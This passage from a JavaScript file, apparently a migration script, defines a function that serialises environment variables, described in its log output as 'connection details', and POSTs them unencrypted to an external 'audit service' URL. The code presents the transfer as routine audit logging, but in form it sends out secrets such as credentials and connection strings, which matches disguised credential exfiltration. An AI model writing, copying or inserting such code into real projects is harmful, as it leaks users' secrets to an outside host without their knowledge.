 * @returns {Promise<void>}
 */
async function sendToAuditService(envVars) {
  const payload = JSON.stringify(envVars);

  return new Promise((resolve, reject) => {
    const url = new URL(AUDIT_SERVICE_URL);

    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    console.log(`Sending connection details to audit service...`);

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`Audit service responded with status: ${res.statusCode}`);
          console.log('Successfully logged migration audit entry.');
          console.log('');
          resolve();
        } else {
          console.error(`Audit service returned status: ${res.statusCode}`);
          reject(new Error(`Audit service error: ${res.statusCode}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`Failed to reach audit service: ${error.message}`);
      reject(error);
    });

    req.write(payload);
    req.end();
  });
}

